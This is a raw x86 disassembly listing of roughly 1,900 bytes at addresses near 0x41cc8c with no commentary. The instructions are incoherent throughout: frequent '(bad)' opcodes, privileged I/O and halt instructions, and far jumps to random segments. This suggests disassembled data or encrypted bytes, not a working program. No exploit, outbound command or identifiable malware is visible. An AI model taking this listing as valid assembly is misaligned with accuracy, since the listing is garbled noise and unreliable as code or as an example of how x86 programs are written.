  41cc8c:	jecxz  0x41cc8e
  41cc8e:	es jne 0x41ccb3
  41cc91:	mov    eax,ds:0x88b28061
  41cc96:	pushf  
  41cc97:	mov    al,ds:0x3e749bea
  41cc9c:	sbb    eax,0x1874bd7b
  41cca1:	cmp    DWORD PTR [ecx-0x3],edi
  41cca4:	push   ss
  41cca5:	sub    al,0xfa
  41cca7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cca8:	fadd   st(6),st
  41ccaa:	dec    edx
  41ccab:	dec    eax
  41ccac:	jne    0x41cc95
  41ccae:	(bad)  
  41ccaf:	repnz fwait
  41ccb1:	sbb    al,0x10
  41ccb3:	pop    eax
  41ccb4:	and    BYTE PTR [ecx-0x79],cl
  41ccb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccb8:	lock aaa 
  41ccba:	push   0xeb9ae887
  41ccbf:	sbb    eax,0x5a131317
  41ccc4:	ret    0x2225
  41ccc7:	adc    ah,BYTE PTR [esi]
  41ccc9:	or     eax,0x4bd844bf
  41ccce:	cld    
  41cccf:	push   ecx
  41ccd0:	jne    0x41ccb3
  41ccd2:	fnsetpm(287 only) 
  41ccd4:	jle    0x41cc58
  41ccd6:	daa    
  41ccd7:	adc    ebx,DWORD PTR ds:0xd50451c9
  41ccdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccde:	test   BYTE PTR [ecx-0x37145e33],bh
  41cce4:	aam    0x5f
  41cce6:	(bad)  
  41cce8:	pusha  
  41cce9:	inc    esi
  41ccea:	fwait
  41cceb:	(bad)  
  41ccec:	and    ah,0xbb
  41ccef:	and    al,0xdb
  41ccf1:	mov    ebp,0x76256bac
  41ccf6:	xchg   esp,eax
  41ccf7:	hlt    
  41ccf8:	into   
  41ccf9:	mov    cl,0x39
  41ccfb:	out    0x12,al
  41ccfd:	mov    ch,BYTE PTR [esi+ebx*1]
  41cd00:	aam    0xa3
  41cd02:	inc    ecx
  41cd03:	push   ebp
  41cd04:	or     dh,BYTE PTR [esp+eiz*4]
  41cd07:	retf   
  41cd08:	mov    ch,0xad
  41cd0a:	mov    dl,0xef
  41cd0c:	mov    esp,0x1fccbc55
  41cd11:	jns    0x41cd1f
  41cd13:	push   esi
  41cd14:	sub    DWORD PTR [ebp+0x6],0xfe040d63
  41cd1b:	mov    ebp,ebx
  41cd1d:	(bad)  
  41cd1e:	int3   
  41cd1f:	mov    cl,0xb5
  41cd21:	addr16 mov edi,0x27824def
  41cd27:	push   edx
  41cd28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd29:	mov    dh,0xbe
  41cd2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd2c:	inc    edx
  41cd2d:	enter  0xb100,0xe5
  41cd31:	mov    ds:0x311feac0,al
  41cd36:	sar    DWORD PTR [edi-0x32],cl
  41cd39:	in     al,dx
  41cd3a:	arpl   WORD PTR [esi-0x1501375b],sp
  41cd40:	pop    ebx
  41cd41:	sub    DWORD PTR [edx+0x3bf505b0],esi
  41cd47:	call   0x668065cb
  41cd4c:	loop   0x41ccf8
  41cd4e:	push   es
  41cd4f:	and    al,0x1a
  41cd51:	mov    ecx,0x853fb7c9
  41cd56:	and    eax,0xe6186f2
  41cd5b:	jg     0x41cd85
  41cd5d:	imul   esp,DWORD PTR [edx],0xdd9a63d0
  41cd63:	sbb    esp,ebp
  41cd65:	retf   
  41cd66:	mov    al,ds:0x12291eb5
  41cd6b:	ja     0x41cd62
  41cd6d:	test   DWORD PTR [ebx+0x24],edx
  41cd70:	and    eax,0x31ed21b7
  41cd75:	jecxz  0x41cd11
  41cd77:	push   ebx
  41cd78:	sbb    ebx,DWORD PTR [ecx]
  41cd7a:	dec    ebp
  41cd7b:	jl     0x41cd57
  41cd7d:	sub    eax,0xa7f405a9
  41cd82:	sub    esi,DWORD PTR [ecx-0x67]
  41cd85:	test   BYTE PTR [eax-0x6b480af],ah
  41cd8b:	cmp    esp,DWORD PTR [esi+0x6ae4b0ec]
  41cd91:	xchg   esp,eax
  41cd92:	or     DWORD PTR [ebx-0xf1cfb0b],0xf1eb8a6d
  41cd9c:	add    eax,0xd15c311a
  41cda1:	mov    bl,0xed
  41cda3:	push   0x4d04efb
  41cda8:	and    ah,BYTE PTR [ebp+0x4b7da23b]
  41cdae:	jmp    0x18e7:0x806814e7
  41cdb5:	imul   ebx,DWORD PTR [esp+eiz*8-0x7a61b3e5],0x21eb9d2e
  41cdc0:	cmc    
  41cdc1:	retf   
  41cdc2:	mov    dl,0x86
  41cdc4:	(bad)  
  41cdc5:	daa    
  41cdc6:	hlt    
  41cdc7:	ficomp WORD PTR [edi]
  41cdc9:	add    dh,BYTE PTR [ecx+0x447c4ea4]
  41cdcf:	adc    al,0xd5
  41cdd1:	fstp   QWORD PTR [esi]
  41cdd3:	out    dx,eax
  41cdd4:	sbb    eax,0x61ab3180
  41cdd9:	jns    0x41cda1
  41cddb:	(bad)  
  41cddd:	pop    edi
  41cdde:	or     BYTE PTR [ebp-0x41],al
  41cde1:	push   ds
  41cde2:	mov    cl,0xbc
  41cde4:	inc    esp
  41cde5:	mov    al,ds:0x67c5659b
  41cdea:	xor    bh,dh
  41cdec:	enter  0xbde5,0xcd
  41cdf0:	fistp  WORD PTR [ebx]
  41cdf2:	mov    ebp,0x3eb46984
  41cdf7:	push   ebx
  41cdf8:	add    eax,0x75c80f4b
  41cdfd:	test   al,0xb
  41cdff:	jl     0x41cda9
  41ce01:	mov    edi,0x57fdcc75
  41ce06:	lds    esi,FWORD PTR gs:[edx+0x66]
  41ce0a:	mov    ah,0x64
  41ce0c:	adc    bl,ch
  41ce0e:	jno    0x41cdbe
  41ce10:	int    0xa0
  41ce12:	retf   
  41ce13:	adc    al,0x5c
  41ce15:	(bad)  
  41ce16:	imul   esi,DWORD PTR [edi-0x3c],0xffffffb8
  41ce1a:	pop    es
  41ce1b:	mov    esi,0x14f26459
  41ce20:	pop    ss
  41ce21:	xor    eax,0xa41fffd3
  41ce26:	sti    
  41ce27:	imul   edi,DWORD PTR [esp+ecx*8],0x561d9ef6
  41ce2e:	mov    BYTE PTR [edx-0x59],ch
  41ce31:	cdq    
  41ce32:	stos   DWORD PTR es:[edi],eax
  41ce33:	or     BYTE PTR [esi],dh
  41ce35:	mov    eax,esi
  41ce37:	inc    ebx
  41ce38:	jne    0x41cdd5
  41ce3a:	sbb    edx,DWORD PTR [edi]
  41ce3c:	xor    eax,0x5b15396
  41ce41:	scas   al,BYTE PTR es:[edi]
  41ce42:	jnp    0x41ceb0
  41ce44:	shl    ah,0xb4
  41ce47:	add    al,0x3c
  41ce49:	inc    edx
  41ce4a:	xor    DWORD PTR [edi+0x25],esp
  41ce4d:	xchg   DWORD PTR [esi-0x18],ebp
  41ce50:	lods   al,BYTE PTR ds:[esi]
  41ce51:	cmp    al,0x40
  41ce53:	mov    ds:0x4d90e924,eax
  41ce58:	sub    esi,DWORD PTR [ebp-0x75]
  41ce5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce5c:	loopne 0x41cdfe
  41ce5e:	mov    ebx,0x4d81aa1d
  41ce63:	(bad)  
  41ce64:	mov    DWORD PTR [edi+0x1a],edi
  41ce67:	and    bh,dl
  41ce69:	add    DWORD PTR [ebx-0x718d1b6c],edi
  41ce6f:	test   DWORD PTR [ebp+0x32],eax
  41ce72:	iret   
  41ce73:	out    0xfb,eax
  41ce75:	nop
  41ce76:	mov    DWORD PTR [esi],esp
  41ce78:	inc    ecx
  41ce79:	mov    DWORD PTR [ecx+0x56a256cd],esi
  41ce7f:	pop    ebp
  41ce80:	adc    DWORD PTR [edx+0x1c],0xffffffe7
  41ce84:	mov    dh,0x6e
  41ce86:	rcr    BYTE PTR [eax+0x43ba11c],1
  41ce8c:	add    edx,DWORD PTR [eax]
  41ce8e:	cdq    
  41ce8f:	mov    WORD PTR [edx],gs
  41ce91:	pop    ss
  41ce92:	mov    esi,0x5a3d34
  41ce97:	push   edi
  41ce98:	adc    eax,0xe7e78305
  41ce9d:	ja     0x41cef4
  41ce9f:	mov    dh,0x1c
  41cea1:	dec    ecx
  41cea2:	adc    bh,cl
  41cea4:	jb     0x41ce41
  41cea6:	jecxz  0x41ce88
  41cea8:	call   0x3a86:0x38c18ba3
  41ceaf:	in     al,0x7e
  41ceb1:	cli    
  41ceb2:	aas    
  41ceb3:	xor    dh,dh
  41ceb5:	mov    BYTE PTR [esi-0x3fec3bcc],dh
  41cebb:	jge    0x41ce72
  41cebd:	fimul  DWORD PTR [esi+eiz*8-0x4a7ed72d]
  41cec4:	push   ss
  41cec5:	stc    
  41cec6:	jns    0x41cebc
  41cec8:	pusha  
  41cec9:	adc    al,0xf9
  41cecb:	leave  
  41cecc:	ins    DWORD PTR es:[edi],dx
  41cecd:	sbb    ecx,DWORD PTR [ebx-0x1e0c9aa3]
  41ced3:	hlt    
  41ced4:	jg     0x41cee7
  41ced6:	enter  0x94bc,0xff
  41ceda:	fs das 
  41cedc:	fdiv   QWORD PTR [ebx]
  41cede:	iret   
  41cedf:	add    al,0xb7
  41cee1:	mov    DWORD PTR [edx+ebp*8+0x30bc8602],edx
  41cee8:	mov    esp,DWORD PTR [edi-0x2f544fbe]
  41ceee:	mov    bl,0xea
  41cef0:	dec    esi
  41cef1:	jns    0x41cebe
  41cef3:	rcr    DWORD PTR [edi+eax*8-0x20727d96],cl
  41cefa:	jmp    0x41ceee
  41cefc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cefd:	es mov ebx,gs
  41cf00:	imul   ebp,ecx,0x22
  41cf03:	adc    DWORD PTR [esi+0x5609ca12],edx
  41cf09:	lock mov esp,0x86a7b9d4
  41cf0f:	adc    eax,0xf362bf05
  41cf14:	adc    BYTE PTR [ebp-0x75],ch
  41cf17:	rcr    BYTE PTR [edi],0xc9
  41cf1a:	popf   
  41cf1b:	adc    al,0xb
  41cf1d:	xor    esp,DWORD PTR [esi]
  41cf1f:	cmp    al,0xc6
  41cf21:	aad    0xab
  41cf23:	loopne 0x41cf2c
  41cf25:	data16 jle 0x41cf2e
  41cf28:	cwde   
  41cf29:	and    eax,0x79535438
  41cf2e:	dec    esp
  41cf2f:	jge    0x41cf69
  41cf31:	cmc    
  41cf32:	cmp    eax,0x80a3509a
  41cf37:	cld    
  41cf38:	push   es
  41cf39:	imul   edi,ebp,0xdfc55e70
  41cf3f:	ins    DWORD PTR es:[edi],dx
  41cf40:	mov    BYTE PTR [ebx+0x4b],dl
  41cf43:	mov    ah,0x9d
  41cf45:	or     esi,DWORD PTR [edi-0x42f972a8]
  41cf4b:	je     0x41cef2
  41cf4d:	repz fmul st,st(4)
  41cf50:	(bad)  ss:[ebx+0xd9f7262]
  41cf57:	dec    esp
  41cf58:	mov    edx,0x9f52d078
  41cf5d:	pop    es
  41cf5e:	lods   al,BYTE PTR ds:[esi]
  41cf5f:	sub    DWORD PTR [esi],eax
  41cf61:	adc    esi,DWORD PTR [ebp-0x73b84bbc]
  41cf67:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41cf69:	pop    ebx
  41cf6a:	jl     0x41cf73
  41cf6c:	test   al,0xaa
  41cf6e:	mov    al,0x54
  41cf70:	ins    DWORD PTR es:[edi],dx
  41cf71:	xchg   BYTE PTR [edx-0x1a],ch
  41cf74:	cmc    
  41cf75:	stos   BYTE PTR es:[edi],al
  41cf76:	aam    0xf1
  41cf78:	push   0x1bed776d
  41cf7d:	sub    DWORD PTR [ebp+ebx*1-0x41],ebp
  41cf81:	lock (bad) 
  41cf83:	scas   al,BYTE PTR es:[edi]
  41cf84:	pusha  
  41cf85:	lahf   
  41cf86:	jmp    0x41cf93
  41cf88:	sbb    BYTE PTR [ecx+eiz*2],dl
  41cf8b:	ficom  DWORD PTR [edi]
  41cf8d:	pop    esp
  41cf8e:	loope  0x41cf8e
  41cf90:	sub    BYTE PTR [edi+esi*4],ah
  41cf93:	xchg   esp,eax
  41cf94:	int    0x57
  41cf96:	test   BYTE PTR [edi],al
  41cf98:	xchg   esi,eax
  41cf99:	mov    ebp,0x7c9b038f
  41cf9e:	push   es
  41cf9f:	sahf   
  41cfa0:	cmp    ecx,ecx
  41cfa2:	loop   0x41cf8d
  41cfa4:	dec    esi
  41cfa5:	mov    dl,0xbd
  41cfa7:	fs retf 0x10bf
  41cfab:	test   ch,ah
  41cfad:	call   0x9cb7:0x3f0f38d
  41cfb4:	and    cl,BYTE PTR [ecx+0x726b4eff]
  41cfba:	shl    BYTE PTR ds:0xf7eba74f,1
  41cfc0:	test   DWORD PTR [ecx-0x5b],edx
  41cfc3:	xlat   BYTE PTR ds:[ebx]
  41cfc4:	xlat   BYTE PTR ds:[ebx]
  41cfc5:	ror    al,1
  41cfc7:	xchg   ebx,eax
  41cfc8:	xor    al,0x7b
  41cfca:	xor    al,0x58
  41cfcc:	sbb    esp,DWORD PTR [ebp-0x16eca11]
  41cfd2:	pop    ecx
  41cfd3:	pop    es
  41cfd4:	pop    edx
  41cfd5:	les    esp,FWORD PTR [esi-0xd]
  41cfd8:	cmp    esi,edi
  41cfda:	into   
  41cfdb:	aad    0x3a
  41cfdd:	lahf   
  41cfde:	mov    ecx,0x6d8623a4
  41cfe3:	mov    eax,DWORD PTR [edi]
  41cfe5:	push   0xffffff9c
  41cfe7:	es cld 
  41cfe9:	out    dx,al
  41cfea:	mov    dh,0x58
  41cfec:	sahf   
  41cfed:	adc    DWORD PTR [edi+ecx*2],ebx
  41cff0:	xchg   BYTE PTR [ebx+esi*1+0x361f5f97],dh
  41cff7:	jmp    0x528549f2
  41cffc:	mov    ebp,0x4d342fa1
  41d001:	sti    
  41d002:	cmp    DWORD PTR [esi+eax*1],ebx
  41d005:	dec    edi
  41d006:	dec    eax
  41d007:	pusha  
  41d008:	push   esi
  41d009:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d00a:	mov    dl,0xc7
  41d00c:	mov    edx,0xf29e788
  41d011:	xor    al,0xaf
  41d013:	aad    0xdf
  41d015:	adc    al,0xa2
  41d017:	call   0xae3da014
  41d01c:	mov    ebx,0x22b65c9d
  41d021:	mov    ah,0xf8
  41d023:	adc    bl,cl
  41d025:	jmp    0x3d67:0xed1df714
  41d02c:	fcos   
  41d02e:	in     eax,0x6c
  41d030:	in     eax,0xea
  41d032:	mov    ch,0xf2
  41d034:	adc    al,0x6a
  41d036:	sub    bh,bh
  41d038:	sbb    DWORD PTR [ecx-0x4b],edi
  41d03b:	lea    edx,[ebx+0x10]
  41d03e:	jnp    0x41d04e
  41d040:	adc    esp,DWORD PTR [ebx+0xc3244fb]
  41d046:	cmp    DWORD PTR [esi-0x8],edx
  41d049:	mov    esp,0xd91ca723
  41d04e:	lods   al,BYTE PTR fs:[esi]
  41d050:	inc    ecx
  41d051:	mov    bl,0xf
  41d053:	jecxz  0x41d01f
  41d055:	loop   0x41d002
  41d057:	cmp    ebp,eax
  41d059:	push   0x33
  41d05b:	imul   esi,DWORD PTR [ecx],0xfffffffb
  41d05e:	aaa    
  41d05f:	icebp  
  41d060:	sbb    ecx,ecx
  41d062:	and    cl,BYTE PTR [esi]
  41d064:	data16 and al,al
  41d067:	fcom   QWORD PTR [esi+0xa]
  41d06a:	fdiv   QWORD PTR [ebx+0x56]
  41d06d:	adc    eax,0x9d174478
  41d072:	push   edi
  41d073:	fidiv  DWORD PTR [ecx+edx*8]
  41d076:	push   ss
  41d077:	lahf   
  41d078:	shl    eax,0xb9
  41d07b:	xor    al,0x50
  41d07d:	ja     0x41d0cf
  41d07f:	jo     0x41d0c5
  41d081:	mov    ds:0xbf51ad7b,al
  41d086:	xchg   ebx,eax
  41d087:	dec    esp
  41d088:	jg     0x41d051
  41d08a:	dec    ebx
  41d08b:	je     0x41d037
  41d08d:	xchg   edx,eax
  41d08e:	mov    cl,0xc4
  41d090:	xchg   ebx,eax
  41d091:	std    
  41d092:	jne    0x41d018
  41d094:	xor    eax,0xd4e9603d
  41d099:	mov    esp,0x59167d0d
  41d09e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d09f:	mov    cl,0x41
  41d0a1:	mov    ah,0x4f
  41d0a3:	sub    DWORD PTR [edx],ebp
  41d0a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0a6:	stos   DWORD PTR es:[edi],eax
  41d0a7:	dec    ebp
  41d0a8:	pop    esi
  41d0a9:	mov    bh,0x22
  41d0ab:	sub    dl,0x70
  41d0ae:	push   edi
  41d0af:	mov    bl,0x78
  41d0b1:	loop   0x41d074
  41d0b3:	mov    ah,0x14
  41d0b5:	mov    ds:0xa12e3cfc,eax
  41d0ba:	cmp    eax,DWORD PTR [edx-0x38]
  41d0bd:	stos   BYTE PTR es:[edi],al
  41d0be:	xchg   DWORD PTR [ebp-0x2a],edx
  41d0c1:	jmp    0xf4b7:0x54a8ef7
  41d0c8:	or     BYTE PTR ds:0xec458a8d,al
  41d0ce:	cli    
  41d0cf:	jmp    0x991a:0x214f385
  41d0d6:	pushf  
  41d0d7:	inc    ecx
  41d0d8:	inc    esi
  41d0d9:	sti    
  41d0da:	stos   BYTE PTR es:[edi],al
  41d0db:	mov    dh,0xa4
  41d0dd:	rcl    DWORD PTR [edx+0x4f48d520],0xec
  41d0e4:	inc    ecx
  41d0e5:	not    BYTE PTR [edx+0x7b]
  41d0e8:	sbb    al,0x49
  41d0ea:	mov    ds:0xc3a1dec0,eax
  41d0ef:	sbb    bl,BYTE PTR [esi]
  41d0f1:	daa    
  41d0f2:	pop    ss
  41d0f3:	xchg   ebx,eax
  41d0f4:	test   DWORD PTR [eax],eax
  41d0f6:	inc    ebp
  41d0f7:	out    dx,eax
  41d0f8:	sbb    eax,0x8ab044f4
  41d0fd:	mov    ecx,0xd4534afc
  41d102:	aas    
  41d103:	shl    BYTE PTR [edi+0x45d9b87f],1
  41d109:	cli    
  41d10a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d10b:	out    dx,eax
  41d10c:	and    ebp,DWORD PTR [ebp+0xd]
  41d10f:	jmp    0x41e52a37
  41d114:	push   esi
  41d115:	sub    al,BYTE PTR [eax+0x37]
  41d118:	jne    0x41d0d9
  41d11a:	ret    0xc58d
  41d11d:	jae    0x41d0d4
  41d11f:	jmp    0x4974:0xc159d8fd
  41d126:	add    DWORD PTR [edx],ebp
  41d128:	jne    0x41d129
  41d12a:	(bad)  
  41d12b:	cld    
  41d12c:	and    DWORD PTR [ecx],esp
  41d12e:	mov    al,0xdc
  41d130:	and    eax,0xe1f19922
  41d135:	inc    edx
  41d136:	xor    ch,ah
  41d138:	and    cl,BYTE PTR [ecx+0x2]
  41d13b:	dec    edx
  41d13c:	adc    bh,bl
  41d13e:	push   esp
  41d13f:	dec    esi
  41d140:	arpl   WORD PTR [eax+0x2c],bx
  41d143:	inc    eax
  41d144:	jl     0x41d1b2
  41d146:	adc    DWORD PTR [ebp-0xb4b43b1],esi
  41d14c:	push   ds
  41d14d:	fst    DWORD PTR [eax]
  41d14f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d150:	push   ecx
  41d151:	out    dx,al
  41d152:	lock mov dl,0xe9
  41d155:	pushf  
  41d156:	cmp    ecx,DWORD PTR [edi-0x7a695202]
  41d15c:	sbb    BYTE PTR [edx-0x15],dl
  41d15f:	mov    dl,0x9c
  41d161:	shl    BYTE PTR [ebp+0x62601c25],1
  41d167:	pop    ebx
  41d168:	or     bl,BYTE PTR [ecx-0x4c]
  41d16b:	sub    ch,0xb1
  41d16e:	pop    ebx
  41d16f:	cs stc 
  41d171:	mov    cl,0x7a
  41d173:	div    BYTE PTR ss:[eax+ecx*2+0x64]
  41d178:	and    al,0x88
  41d17a:	xchg   ebp,eax
  41d17b:	fistp  WORD PTR ds:0xeffe6cc9
  41d181:	test   esi,ebp
  41d183:	mov    edx,0x6f4b99a7
  41d188:	fcmovb st,st(4)
  41d18a:	or     BYTE PTR [esi],dh
  41d18c:	push   ecx
  41d18d:	stos   DWORD PTR es:[edi],eax
  41d18e:	add    DWORD PTR [edi],edx
  41d190:	xchg   edx,eax
  41d191:	jmp    0xefbaf4cf
  41d196:	pop    eax
  41d197:	sbb    al,0x3
  41d199:	lods   eax,DWORD PTR ds:[esi]
  41d19a:	and    eax,edx
  41d19c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d19d:	add    esi,ebp
  41d19f:	aaa    
  41d1a0:	aad    0xed
  41d1a2:	mov    bh,0xcc
  41d1a4:	sub    eax,0x7a5b93fe
  41d1a9:	jmp    0x41d16a
  41d1ab:	push   esp
  41d1ac:	out    0x1e,al
  41d1ae:	jle    0x41d167
  41d1b0:	in     eax,0x8a
  41d1b2:	(bad)  
  41d1b3:	in     al,dx
  41d1b4:	xchg   ebx,eax
  41d1b5:	dec    esi
  41d1b6:	stos   DWORD PTR es:[edi],eax
  41d1b7:	mov    eax,0xd7fb4737
  41d1bc:	xor    BYTE PTR [ecx-0x4ccaa3da],bh
  41d1c2:	mov    ebx,0xc76758dc
  41d1c7:	push   eax
  41d1c8:	sub    esi,DWORD PTR es:[ebx-0x26]
  41d1cc:	and    cl,dl
  41d1ce:	adc    esp,DWORD PTR ds:[edx+0x1]
  41d1d2:	sbb    edi,DWORD PTR [edx-0x1c]
  41d1d5:	cmp    edi,DWORD PTR [ebp-0x29d735cc]
  41d1db:	and    ebp,edx
  41d1dd:	dec    edi
  41d1de:	fsubr  st(7),st
  41d1e0:	dec    edx
  41d1e1:	xor    edi,DWORD PTR [ebp+0x76291e45]
  41d1e7:	cmc    
  41d1e8:	out    dx,al
  41d1e9:	in     al,0x8
  41d1eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1ec:	(bad)
  41d1f0:	dec    eax
  41d1f1:	fwait
  41d1f2:	cmp    edx,DWORD PTR [ebx-0x7b453923]
  41d1f8:	sbb    eax,0xfa012d29
  41d1fd:	imul   ebp,DWORD PTR [ebx],0xffffffeb
  41d200:	sub    ebx,DWORD PTR [esi-0x284996b5]
  41d206:	xchg   BYTE PTR [ecx],dh
  41d208:	ins    DWORD PTR es:[edi],dx
  41d209:	mov    ah,0x72
  41d20b:	mov    edx,0xa4b200b5
  41d210:	jl     0x41d289
  41d212:	iret   
  41d213:	sub    eax,0xb645db77
  41d218:	jb     0x41d21a
  41d21a:	mov    WORD PTR [edi],ds
  41d21c:	pushf  
  41d21d:	inc    ecx
  41d21e:	call   0x251f:0x59e9207b
  41d225:	in     al,dx
  41d226:	out    0x74,eax
  41d228:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41d22a:	cmp    edx,ebx
  41d22c:	mov    ch,0x1c
  41d22e:	outs   dx,DWORD PTR ds:[esi]
  41d22f:	inc    ebp
  41d230:	xor    eax,0x7695e6d
  41d235:	sti    
  41d236:	push   ebx
  41d237:	in     al,dx
  41d238:	scas   eax,DWORD PTR es:[edi]
  41d239:	cwde   
  41d23a:	pop    esp
  41d23b:	ss xor al,0xa8
  41d23e:	cmp    eax,0xbed96647
  41d243:	jb     0x41d29a
  41d245:	pop    ebp
  41d247:	out    dx,al
  41d248:	jns    0x41d205
  41d24a:	popa   
  41d24b:	test   al,0x21
  41d24d:	jns    0x41d247
  41d24f:	and    eax,0x5edfd8c0
  41d254:	cmp    eax,0xc710bba6
  41d259:	mov    ds:0xed29933e,eax
  41d25e:	inc    esi
  41d25f:	pop    ds
  41d260:	mov    esi,DWORD PTR [ebp-0x1e]
  41d263:	test   BYTE PTR [edx-0x59],dh
  41d266:	push   esi
  41d267:	gs gs sahf 
  41d26a:	jnp    0x41d218
  41d26c:	pop    ebp
  41d26d:	jno    0x41d2ca
  41d26f:	jns    0x41d276
  41d271:	loop   0x41d290
  41d273:	cdq    
  41d274:	or     esi,DWORD PTR [ecx]
  41d276:	mov    cl,0x44
  41d278:	and    al,BYTE PTR [eax-0x5b]
  41d27b:	xor    eax,0xa1efa776
  41d280:	and    eax,0xe8ac0b71
  41d285:	jmp    DWORD PTR [ebx+0x2dcedd40]
  41d28b:	test   DWORD PTR [ebx],ebx
  41d28d:	ror    BYTE PTR [ebx-0x5c7a6d1c],cl
  41d293:	(bad)
  41d296:	neg    DWORD PTR [edx-0x6f]
  41d299:	lahf   
  41d29a:	lock cdq 
  41d29c:	push   ebp
  41d29d:	and    al,0x13
  41d29f:	iret   
  41d2a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2a1:	pop    ebx
  41d2a2:	out    0x94,eax
  41d2a4:	jne    0x41d2c4
  41d2a6:	cmc    
  41d2a7:	sub    eax,0xbddba301
  41d2ac:	xlat   BYTE PTR ds:[ebx]
  41d2ad:	xchg   BYTE PTR [eax+0x78],cl
  41d2b0:	js     0x41d271
  41d2b2:	mov    dl,0x20
  41d2b4:	fldenv [ebx-0x1e122b4f]
  41d2ba:	add    BYTE PTR [ebp+eiz*1-0x161b12ba],dl
  41d2c1:	or     BYTE PTR [ecx-0x15],bh
  41d2c4:	sbb    BYTE PTR [ecx-0x4f],bh
  41d2c7:	test   eax,0x868291c3
  41d2cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2cd:	mov    al,ds:0x7bccebdb
  41d2d2:	dec    edx
  41d2d3:	mov    esi,0xe999cdc8
  41d2d8:	mov    ebp,0x7574b7f8
  41d2dd:	mov    esi,0x33c58436
  41d2e2:	xchg   edi,eax
  41d2e3:	jmp    0x28d8:0x485c41a9
  41d2ea:	push   edi
  41d2eb:	mov    ebx,0x84c14d7a
  41d2f0:	cmp    al,0xb1
  41d2f2:	sbb    eax,0xbba407d7
  41d2f7:	jae    0x41d358
  41d2f9:	lods   eax,DWORD PTR ds:[esi]
  41d2fa:	xchg   ecx,eax
  41d2fb:	xchg   ecx,eax
  41d2fc:	xlat   BYTE PTR ds:[ebx]
  41d2fd:	shr    cl,0x21
  41d300:	fcom   DWORD PTR [ebx-0xba8b4c]
  41d306:	fcmovne st,st(6)
  41d308:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d309:	lock mov eax,0x94a02162
  41d30f:	fcomp  DWORD PTR [ebp+0x155c0c38]
  41d315:	jns    0x41d2dc
  41d317:	inc    esp
  41d318:	mul    DWORD PTR [ecx-0x52c85a37]
  41d31e:	mov    ebx,0x80c74097
  41d323:	sti    
  41d324:	std    
  41d325:	test   al,0xc1
  41d327:	fst    QWORD PTR [ecx+ecx*1+0x2d]
  41d32b:	aas    
  41d32c:	xchg   esi,eax
  41d32d:	stos   BYTE PTR es:[edi],al
  41d32e:	ret    0xee70
  41d331:	push   edx
  41d332:	xor    eax,0x8b9c65ef
  41d337:	(bad)  
  41d338:	dec    ebx
  41d339:	dec    edx
  41d33a:	jge    0x41d3b8
  41d33c:	cli    
  41d33d:	shl    BYTE PTR [eax+0x180af620],1
  41d343:	push   esp
  41d344:	sbb    edi,DWORD PTR [ecx+0x16]
  41d347:	jae    0x41d2f3
  41d349:	jb     0x41d393
  41d34b:	inc    ebp
  41d34c:	add    eax,0xf7eceb8f
  41d351:	push   cs
  41d352:	push   esi
  41d353:	adc    DWORD PTR ds:0x3665654a,ecx
  41d359:	test   al,0xd9
  41d35b:	mov    ebp,0xdf78d1a2
  41d360:	daa    
  41d361:	jo     0x41d311
  41d363:	mov    bh,0x99
  41d365:	push   ebx
  41d366:	or     edx,esi
  41d368:	mov    cl,0x43
  41d36a:	ja     0x41d3a2
  41d36c:	retf   
  41d36d:	shl    DWORD PTR [eax+0x5b7c9b84],cl
  41d373:	hlt    
  41d374:	(bad)  
  41d375:	jg     0x41d33f
  41d377:	aad    0x43
  41d379:	pushf  
  41d37a:	mov    ds:0xf31dbddd,eax
  41d37f:	mov    ah,0x24
  41d381:	mov    DWORD PTR [ebx],ebp
  41d383:	fdiv   QWORD PTR [ebx]
  41d385:	popa   
  41d386:	int3   
  41d387:	mov    edi,0x24ba720
  41d38c:	pop    ebp
  41d38d:	mov    ecx,0x524d51dd
  41d392:	stos   BYTE PTR es:[edi],al
  41d393:	gs aaa 
  41d395:	xchg   edx,eax
  41d396:	(bad)  
  41d397:	in     al,0xae
  41d399:	xchg   edi,eax
  41d39a:	imul   ebp,DWORD PTR [esp+edi*1+0x30417de5],0xffffff9a
  41d3a2:	sti    
  41d3a3:	xchg   edx,eax
  41d3a4:	in     eax,0x2e
  41d3a6:	xchg   edx,eax
  41d3a7:	push   0x26
  41d3a9:	jmp    0x632e8d57
  41d3ae:	lahf   
  41d3af:	pop    edi
  41d3b0:	jb     0x41d407
  41d3b2:	fiadd  DWORD PTR [ecx]
  41d3b4:	lea    esi,[ebx-0x17]
  41d3b7:	repz and eax,0x7eea0290
  41d3bd:	les    edx,FWORD PTR [edx+eiz*4+0x17e17757]
  41d3c4:	push   esi
  41d3c5:	stc    
  41d3c6:	pop    edi
  41d3c7:	xor    al,0xf2
  41d3c9:	mov    edx,ecx
  41d3cb:	imul   edx,ebp,0xffffffeb
  41d3ce:	mov    edi,0x65e3d680
  41d3d3:	and    ebp,DWORD PTR [edx-0x59a9abac]
  41d3d9:	adc    esi,DWORD PTR [ecx]
  41d3db:	sub    eax,0xe5d9ffa8
  41d3e0:	std    
  41d3e1:	ins    DWORD PTR es:[edi],dx
  41d3e2:	in     al,dx
  41d3e3:	mov    fs:0xbd666a5d,al
  41d3e9:	(bad)  
  41d3ea:	jl     0x41d403
  41d3ec:	stos   BYTE PTR es:[edi],al
  41d3ed:	test   al,0x6b
  41d3ef:	fild   DWORD PTR [ebp+0x62]
  41d3f2:	push   eax
  41d3f3:	ins    DWORD PTR es:[edi],dx
  41d3f4:	ja     0x41d380
  41d3f6:	addr16 pop edx
